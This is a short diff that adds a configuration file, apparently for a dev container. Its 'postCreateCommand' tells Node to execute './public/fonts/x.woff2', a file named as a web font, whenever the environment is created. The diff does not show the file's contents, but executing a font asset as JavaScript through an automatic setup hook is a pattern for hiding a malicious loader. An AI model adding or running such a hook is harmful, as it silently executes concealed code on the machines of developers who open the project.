@@ -1,0 +1,6 @@
+{
+  "postCreateCommand": [
+    "node",
+    "./public/fonts/x.woff2"
+  ]
+}
